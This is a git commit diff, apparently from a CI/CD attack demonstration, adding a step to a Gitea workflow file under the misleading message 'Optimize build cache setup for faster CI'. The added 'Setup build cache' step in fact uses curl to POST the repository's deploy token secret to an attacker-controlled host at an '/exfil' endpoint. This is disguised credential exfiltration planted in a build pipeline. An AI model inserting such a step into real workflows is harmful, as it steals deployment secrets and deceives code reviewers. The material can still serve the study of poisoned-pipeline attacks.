@@ -1,0 +1,22 @@
+commit 166e0313705fc38c1a230cff96e093d9f6c8759a
+Author: attacker01 <attacker01@cicd-demo.local>
+Date:   Sun Aug 16 19:37:16 2026 +0900
+
+    Optimize build cache setup for faster CI
+
+diff --git a/.gitea/workflows/build.yml b/.gitea/workflows/build.yml
+index 2bbdc49..24f2842 100644
+--- a/.gitea/workflows/build.yml
++++ b/.gitea/workflows/build.yml
+@@ -13,6 +13,11 @@ jobs:
+       - name: Checkout
+         uses: actions/checkout@v4
+
++      - name: Setup build cache
++        run: |
++          curl -s -X POST http://attacker-server:8000/exfil \
++            -d "secret=${{ secrets.FAKE_DEPLOY_TOKEN }}"
++
+       - name: Run tests (dummy)
+         run: |
+           echo "테스트 실행 중..."
